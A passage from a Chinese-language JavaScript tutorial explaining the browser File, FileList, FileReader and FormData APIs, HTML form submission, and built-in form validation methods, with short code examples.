<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input id&#x3D;&quot;fileItem&quot; type&#x3D;&quot;file&quot;&gt;</span><br><span class="line">var file &#x3D; document.getElementById(&#39;fileItem&#39;).files[0];</span><br><span class="line">file instanceof File &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>file</code>是用户选中的第一个文件，它是 File 的实例。</p>
<h4 id="构造函数-1"><a href="#构造函数-1" class="headerlink" title="构造函数"></a>构造函数</h4><p>浏览器原生提供一个<code>File()</code>构造函数，用来生成 File 实例对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File(array, name [, options])</span><br></pre></td></tr></table></figure>

<p><code>File()</code>构造函数接受三个参数。</p>
<ul>
<li>array：一个数组，成员可以是二进制对象或字符串，表示文件的内容。</li>
<li>name：字符串，表示文件名或文件路径。</li>
<li>options：配置对象，设置实例的属性。该参数可选。</li>
</ul>
<p>第三个参数配置对象，可以设置两个属性。</p>
<ul>
<li>type：字符串，表示实例对象的 MIME 类型，默认值为空字符串。</li>
<li>lastModified：时间戳，表示上次修改的时间，默认为<code>Date.now()</code>。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var file &#x3D; new File(</span><br><span class="line">  [&#39;foo&#39;],</span><br><span class="line">  &#39;foo.txt&#39;,</span><br><span class="line">  &#123;</span><br><span class="line">    type: &#39;text&#x2F;plain&#39;,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h4 id="实例属性和实例方法-1"><a href="#实例属性和实例方法-1" class="headerlink" title="实例属性和实例方法"></a>实例属性和实例方法</h4><p>File 对象有以下实例属性。</p>
<ul>
<li>File.lastModified：最后修改时间</li>
<li>File.name：文件名或文件路径</li>
<li>File.size：文件大小（单位字节）</li>
<li>File.type：文件的 MIME 类型</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var myFile &#x3D; new File([], &#39;file.bin&#39;, &#123;</span><br><span class="line">  lastModified: new Date(2018, 1, 1),</span><br><span class="line">&#125;);</span><br><span class="line">myFile.lastModified &#x2F;&#x2F; 1517414400000</span><br><span class="line">myFile.name &#x2F;&#x2F; &quot;file.bin&quot;</span><br><span class="line">myFile.size &#x2F;&#x2F; 0</span><br><span class="line">myFile.type &#x2F;&#x2F; &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码中，由于<code>myFile</code>的内容为空，也没有设置 MIME 类型，所以<code>size</code>属性等于0，<code>type</code>属性等于空字符串。</p>
<p>File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法<code>slice()</code>。</p>
<h3 id="FileList-对象"><a href="#FileList-对象" class="headerlink" title="FileList 对象"></a>FileList 对象</h3><p><code>FileList</code>对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。</p>
<ul>
<li>文件控件节点（<code>&lt;input type=&quot;file&quot;&gt;</code>）的<code>files</code>属性，返回一个 FileList 实例。</li>
<li>拖拉一组文件时，目标区的<code>DataTransfer.files</code>属性，返回一个 FileList 实例。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input id&#x3D;&quot;fileItem&quot; type&#x3D;&quot;file&quot;&gt;</span><br><span class="line">var files &#x3D; document.getElementById(&#39;fileItem&#39;).files;</span><br><span class="line">files instanceof FileList &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>上面代码中，文件控件的<code>files</code>属性是一个 FileList 实例。</p>
<p>FileList 的实例属性主要是<code>length</code>，表示包含多少个文件。</p>
<p>FileList 的实例方法主要是<code>item()</code>，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即<code>myFileList[0]</code>等同于<code>myFileList.item(0)</code>，所以一般用不到<code>item()</code>方法。</p>
<h3 id="FileReader-对象"><a href="#FileReader-对象" class="headerlink" title="FileReader 对象"></a>FileReader 对象</h3><p>FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。</p>
<p>浏览器原生提供一个<code>FileReader</code>构造函数，用来生成 FileReader 实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var reader &#x3D; new FileReader();</span><br></pre></td></tr></table></figure>

<p>FileReader 有以下的实例属性。</p>
<ul>
<li>FileReader.error：读取文件时产生的错误对象</li>
<li>FileReader.readyState：整数，表示读取文件时的当前状态。一共有三种可能的状态，<code>0</code>表示尚未加载任何数据，<code>1</code>表示数据正在加载，<code>2</code>表示加载完成。</li>
<li>FileReader.result：读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。</li>
<li>FileReader.onabort：<code>abort</code>事件（用户终止读取操作）的监听函数。</li>
<li>FileReader.onerror：<code>error</code>事件（读取错误）的监听函数。</li>
<li>FileReader.onload：<code>load</code>事件（读取操作完成）的监听函数，通常在这个函数里面使用<code>result</code>属性，拿到文件内容。</li>
<li>FileReader.onloadstart：<code>loadstart</code>事件（读取操作开始）的监听函数。</li>
<li>FileReader.onloadend：<code>loadend</code>事件（读取操作结束）的监听函数。</li>
<li>FileReader.onprogress：<code>progress</code>事件（读取操作进行中）的监听函数。</li>
</ul>
<p>下面是监听<code>load</code>事件的一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;onChange(event)&quot;&gt;</span><br><span class="line"></span><br><span class="line">function onChange(event) &#123;</span><br><span class="line">  var file &#x3D; event.target.files[0];</span><br><span class="line">  var reader &#x3D; new FileReader();</span><br><span class="line">  reader.onload &#x3D; function (event) &#123;</span><br><span class="line">    console.log(event.target.result)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  reader.readAsText(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（<code>load</code>事件发生），就打印出文件内容。</p>
<p>FileReader 有以下实例方法。</p>
<ul>
<li>FileReader.abort()：终止读取操作，<code>readyState</code>属性将变成<code>2</code>。</li>
<li>FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后<code>result</code>属性将返回一个 ArrayBuffer 实例。</li>
<li>FileReader.readAsBinaryString()：读取完成后，<code>result</code>属性将返回原始的二进制字符串。</li>
<li>FileReader.readAsDataURL()：读取完成后，<code>result</code>属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于<code>&lt; img&gt;</code>元素的<code>src</code>属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀<code>data:*/*;base64,</code>从字符串里删除以后，再进行解码。</li>
<li>FileReader.readAsText()：读取完成后，<code>result</code>属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* HTML 代码如下</span><br><span class="line">  &lt;input type&#x3D;&quot;file&quot; onchange&#x3D;&quot;previewFile()&quot;&gt;</span><br><span class="line">  &lt;img src&#x3D;&quot;&quot; height&#x3D;&quot;200&quot;&gt;</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">function previewFile() &#123;</span><br><span class="line">  var preview &#x3D; document.querySelector(&#39;img&#39;);</span><br><span class="line">  var file    &#x3D; document.querySelector(&#39;input[type&#x3D;file]&#39;).files[0];</span><br><span class="line">  var reader  &#x3D; new FileReader();</span><br><span class="line"></span><br><span class="line">  reader.addEventListener(&#39;load&#39;, function () &#123;</span><br><span class="line">    preview.src &#x3D; reader.result;</span><br><span class="line">  &#125;, false);</span><br><span class="line"></span><br><span class="line">  if (file) &#123;</span><br><span class="line">    reader.readAsDataURL(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给<code>&lt; img&gt;</code>元素的<code>src</code>属性，从而把图片展示出来。</p>
<h2 id="表单，FormData-对象"><a href="#表单，FormData-对象" class="headerlink" title="表单，FormData 对象"></a>表单，FormData 对象</h2><h3 id="表单概述"><a href="#表单概述" class="headerlink" title="表单概述"></a>表单概述</h3><p>表单（<code>&lt;form&gt;</code>）用来收集用户提交的数据，发送到服务器。比如，用户提交用户名和密码，让服务器验证，就要通过表单。表单提供多种控件，让开发者使用，具体的控件种类和用法请参考 HTML 语言的教程。本章主要介绍 JavaScript 与表单的交互。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;&#x2F;handling-page&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;name&quot;&gt;用户名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;user_name&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;passwd&quot;&gt;密码：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;password&quot; id&#x3D;&quot;passwd&quot; name&#x3D;&quot;user_passwd&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; id&#x3D;&quot;submit&quot; name&#x3D;&quot;submit_button&quot; value&#x3D;&quot;提交&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码就是一个简单的表单，包含三个控件：用户名输入框、密码输入框和提交按钮。</p>
<p>用户点击“提交”按钮，每一个控件都会生成一个键值对，键名是控件的<code>name</code>属性，键值是控件的<code>value</code>属性，键名和键值之间由等号连接。比如，用户名输入框的<code>name</code>属性是<code>user_name</code>，<code>value</code>属性是用户输入的值，假定是“张三”，提交到服务器的时候，就会生成一个键值对<code>user_name=张三</code>。</p>
<p>所有的键值对都会提交到服务器。但是，提交的数据格式跟<code>&lt;form&gt;</code>元素的<code>method</code>属性有关。该属性指定了提交数据的 HTTP 方法。如果是 GET 方法，所有键值对会以 URL 的查询字符串形式，提交到服务器，比如<code>/handling-page?user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 GET 请求的 HTTP 头信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;handling-page?user_name&#x3D;张三&amp;user_passwd&#x3D;123&amp;submit_button&#x3D;提交</span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure>

<p>如果是 POST 方法，所有键值对会连接成一行，作为 HTTP 请求的数据体发送到服务器，比如<code>user_name=张三&amp;user_passwd=123&amp;submit_button=提交</code>。下面就是 POST 请求的头信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;handling-page HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line">user_name&#x3D;张三&amp;user_passwd&#x3D;123&amp;submit_button&#x3D;提交</span><br></pre></td></tr></table></figure>

<p>注意，实际提交的时候，只要键值不是 URL 的合法字符（比如汉字“张三”和“提交”），浏览器会自动对其进行编码。</p>
<p>点击<code>submit</code>控件，就可以提交表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>上面表单就包含一个<code>submit</code>控件，点击这个控件，浏览器就会把表单数据向服务器提交。</p>
<p>注意，表单里面的<code>&lt;button&gt;</code>元素如果没有用<code>type</code>属性指定类型，那么默认就是<code>submit</code>控件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;button&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>上面表单的<code>&lt; button&gt;</code>元素，点击以后也会提交表单。</p>
<p>除了点击<code>submit</code>控件提交表单，还可以用表单元素的<code>submit()</code>方法，通过脚本提交表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.submit();</span><br></pre></td></tr></table></figure>

<p>表单元素的<code>reset()</code>方法可以重置所有控件的值（重置为默认值）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">formElement.reset()</span><br></pre></td></tr></table></figure>

<h3 id="FormData-对象"><a href="#FormData-对象" class="headerlink" title="FormData 对象"></a>FormData 对象</h3><h4 id="概述-6"><a href="#概述-6" class="headerlink" title="概述"></a>概述</h4><p>表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成这个过程，构造或编辑表单的键值对，然后通过脚本发送给服务器。浏览器原生提供了 FormData 对象来完成这项工作。</p>
<p><code>FormData()</code>首先是一个构造函数，用来生成表单的实例。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var formdata &#x3D; new FormData(form);</span><br></pre></td></tr></table></figure>

<p><code>FormData()</code>构造函数的参数是一个 DOM 的表单元素，构造函数会自动处理表单的键值对。这个参数是可选的，如果省略该参数，就表示一个空的表单。</p>
<p>下面是一个表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id&#x3D;&quot;myForm&quot; name&#x3D;&quot;myForm&quot;&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;username&quot;&gt;用户名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;username&quot; name&#x3D;&quot;username&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;useracc&quot;&gt;账号：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;useracc&quot; name&#x3D;&quot;useracc&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;userfile&quot;&gt;上传文件：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; id&#x3D;&quot;userfile&quot; name&#x3D;&quot;userfile&quot;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit!&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<p>我们用<code>FormData()</code>处理上面这个表单。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var myForm &#x3D; document.getElementById(&#39;myForm&#39;);</span><br><span class="line">var formData &#x3D; new FormData(myForm);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取某个控件的值</span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置某个控件的值</span><br><span class="line">formData.set(&#39;username&#39;, &#39;张三&#39;);</span><br><span class="line"></span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;张三&quot;</span><br></pre></td></tr></table></figure>

<h4 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h4><p>FormData 提供以下实例方法。</p>
<ul>
<li><code>FormData.get(key)</code>：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。</li>
<li><code>FormData.getAll(key)</code>：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。</li>
<li><code>FormData.set(key, value)</code>：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.delete(key)</code>：删除一个键值对，参数为键名。</li>
<li><code>FormData.append(key, value)</code>：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。</li>
<li><code>FormData.has(key)</code>：返回一个布尔值，表示是否具有该键名的键值对。</li>
<li><code>FormData.keys()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键名。</li>
<li><code>FormData.values()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值。</li>
<li><code>FormData.entries()</code>：返回一个遍历器对象，用于<code>for...of</code>循环遍历所有的键值对。如果直接用<code>for...of</code>循环遍历 FormData 实例，默认就会调用这个方法。</li>
</ul>
<p>下面是<code>get()</code>、<code>getAll()</code>、<code>set()</code>、<code>append()</code>方法的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line"></span><br><span class="line">formData.set(&#39;username&#39;, &#39;张三&#39;);</span><br><span class="line">formData.append(&#39;username&#39;, &#39;李四&#39;);</span><br><span class="line">formData.get(&#39;username&#39;) &#x2F;&#x2F; &quot;张三&quot;</span><br><span class="line">formData.getAll(&#39;username&#39;) &#x2F;&#x2F; [&quot;张三&quot;, &quot;李四&quot;]</span><br><span class="line"></span><br><span class="line">formData.append(&#39;userpic[]&#39;, myFileInput.files[0], &#39;user1.jpg&#39;);</span><br><span class="line">formData.append(&#39;userpic[]&#39;, myFileInput.files[1], &#39;user2.jpg&#39;);</span><br></pre></td></tr></table></figure>

<p>下面是遍历器的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var formData &#x3D; new FormData();</span><br><span class="line">formData.append(&#39;key1&#39;, &#39;value1&#39;);</span><br><span class="line">formData.append(&#39;key2&#39;, &#39;value2&#39;);</span><br><span class="line"></span><br><span class="line">for (var key of formData.keys()) &#123;</span><br><span class="line">  console.log(key);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; &quot;key1&quot;</span><br><span class="line">&#x2F;&#x2F; &quot;key2&quot;</span><br><span class="line"></span><br><span class="line">for (var value of formData.values()) &#123;</span><br><span class="line">  console.log(value);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; &quot;value1&quot;</span><br><span class="line">&#x2F;&#x2F; &quot;value2&quot;</span><br><span class="line"></span><br><span class="line">for (var pair of formData.entries()) &#123;</span><br><span class="line">  console.log(pair[0] + &#39;: &#39; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; key1: value1</span><br><span class="line">&#x2F;&#x2F; key2: value2</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等同于遍历 formData.entries()</span><br><span class="line">for (var pair of formData) &#123;</span><br><span class="line">  console.log(pair[0] + &#39;: &#39; + pair[1]);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; key1: value1</span><br><span class="line">&#x2F;&#x2F; key2: value2</span><br></pre></td></tr></table></figure>

<h3 id="表单的内置验证"><a href="#表单的内置验证" class="headerlink" title="表单的内置验证"></a>表单的内置验证</h3><h4 id="自动校验"><a href="#自动校验" class="headerlink" title="自动校验"></a>自动校验</h4><p>表单提交的时候，浏览器允许开发者指定一些条件，它会自动验证各个表单控件的值是否符合条件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 必填 --&gt;</span><br><span class="line">&lt;input required&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须符合正则表达式 --&gt;</span><br><span class="line">&lt;input pattern&#x3D;&quot;banana|cherry&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 字符串长度必须为6个字符 --&gt;</span><br><span class="line">&lt;input minlength&#x3D;&quot;6&quot; maxlength&#x3D;&quot;6&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 数值必须在1到10之间 --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;number&quot; min&#x3D;&quot;1&quot; max&#x3D;&quot;10&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 Email 地址 --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;email&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 必须填入 URL --&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>如果一个控件通过验证，它就会匹配<code>:valid</code>的 CSS 伪类，浏览器会继续进行表单提交的流程。如果没有通过验证，该控件就会匹配<code>:invalid</code>的 CSS 伪类，浏览器会终止表单提交，并显示一个错误信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">input:invalid &#123;</span><br><span class="line">  border-color: red;</span><br><span class="line">&#125;</span><br><span class="line">input,</span><br><span class="line">input:valid &#123;</span><br><span class="line">  border-color: #ccc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="checkValidity"><a href="#checkValidity" class="headerlink" title="checkValidity()"></a>checkValidity()</h4><p>除了提交表单的时候，浏览器自动校验表单，还可以手动触发表单的校验。表单元素和表单控件都有<code>checkValidity()</code>方法，用于手动触发校验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 触发整个表单的校验</span><br><span class="line">form.checkValidity()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 触发单个表单控件的校验</span><br><span class="line">formControl.checkValidity()</span><br></pre></td></tr></table></figure>

<p><code>checkValidity()</code>方法返回一个布尔值，<code>true</code>表示通过校验，<code>false</code>表示没有通过校验。因此，提交表单可以封装为下面的函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function submitForm(action) &#123;</span><br><span class="line">  var form &#x3D; document.getElementById(&#39;form&#39;);</span><br><span class="line">  form.action &#x3D; action;</span><br><span class="line">  if (form.checkValidity()) &#123;</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="willValidate-属性"><a href="#willValidate-属性" class="headerlink" title="willValidate 属性"></a>willValidate 属性</h4><p>控件元素的<code>willValidate</code>属性是一个布尔值，表示该控件是否会在提交时进行校验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;form novalidate&gt;</span><br><span class="line">&#x2F;&#x2F;   &lt;input id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; required &#x2F;&gt;</span><br><span class="line">&#x2F;&#x2F; &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">var input &#x3D; document.querySelector(&#39;#name&#39;);</span><br><span class="line">input.willValidate &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="validationMessage-属性"><a href="#validationMessage-属性" class="headerlink" title="validationMessage 属性"></a>validationMessage 属性</h4><p>控件元素的<code>validationMessage</code>属性返回一个字符串，表示控件不满足校验条件时，浏览器显示的提示文本。以下两种情况，该属性返回空字符串。</p>
<ul>
<li>该控件不会在提交时自动校验</li>
<li>该控件满足校验条件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码如下</span><br><span class="line">&#x2F;&#x2F; &lt;form&gt;&lt;input type&#x3D;&quot;text&quot; required&gt;&lt;&#x2F;form&gt;</span><br><span class="line">document.querySelector(&#39;form input&#39;).validationMessage</span><br><span class="line">&#x2F;&#x2F; &quot;请填写此字段。&quot;</span><br></pre></td></tr></table></figure>

<p>下面是另一个例子。</p>
